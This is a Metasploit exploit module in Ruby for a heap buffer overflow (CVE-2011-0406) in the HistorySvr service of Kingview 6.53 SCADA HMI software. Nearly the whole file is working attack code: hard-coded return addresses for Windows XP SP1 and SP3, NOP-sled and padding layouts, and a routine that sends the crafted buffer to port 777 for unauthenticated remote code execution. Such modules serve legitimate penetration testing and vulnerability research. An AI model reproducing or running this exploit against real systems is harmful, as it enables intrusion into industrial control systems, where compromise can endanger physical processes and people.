##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'        => "Kingview 6.53 SCADA HMI HistorySvr Heap Overflow",
			'Description' => %q{
				This module exploits a buffer overflow in Kingview 6.53.  By sending a specially
				crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to
				gain arbitrary code execution without authentication.
			},
			'License'	  => MSF_LICENSE,
			'Version'	  => "$Revision$",
			'Author'      =>
				[
					'Dillon Beresford',  #Found by Dillon
					'rick2600',          #XP SP3 execution
				],
			'References' =>
				[
					['CVE', '2011-0406'],
					['OSVDB', '70366'],
					['Bugtraq', '45727'],
					['URL', 'http://www.exploit-db.com/exploits/15957'],
					['URL', 'http://www.kb.cert.org/vuls/id/180119'],
					['URL', 'http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html'],
				],
			'Payload'	 =>
				{
					'BadChars' => "\x00\x0d\x0a\xff"
				},
			'Platform' => 'win',	
			'Targets'	 =>
				[
					[ 'Windows XP SP1', {'Ret' => 0x77ED73B4} ], #UnhandledExceptionFilter() in kernel32.dll
					[ 'Windows XP SP3 EN', {'Ret' => 0x00A1FB84} ],
				],
			'DisclosureDate' => "9/28/2010",
			'DefaultTarget' => 0))

			register_options( [ Opt::RPORT(777) ], self.class )
	end

	def exploit
		sploit = ''
		if target.name =~ /XP SP1/

			sploit << make_nops(32812)
			sploit << "\xEB\x10"
			sploit << "\x41"*6
			sploit << "\xAD\xBB\xC3\x77"
			sploit << [target.ret].pack('V')
			sploit << make_nops(8)
			sploit << payload.encoded
			sploit << "\x44"*(1000-payload.encoded.length)
			#this makes the app more crashy, need to investigatev
			#sploit << make_nops(1000-payload.encoded.length) 

		elsif target.name =~ /XP SP3/

			sploit << make_nops(1024)
			sploit << payload.encoded
			sploit << "\x44"*(31752-payload.encoded.length)
			#rand_text_alpha_xxx() unfortunately makes it a bit unstable,
			#not ready to implement
			#sploit << rand_text_alpha_upper(32776-sploit.length)
			sploit << [target.ret].pack('V')

		end

		connect

		print_status("Trying target #{target.name}")
		sock.write(sploit)

		select(nil, nil, nil, 5)
		handler
		disconnect

	end
end
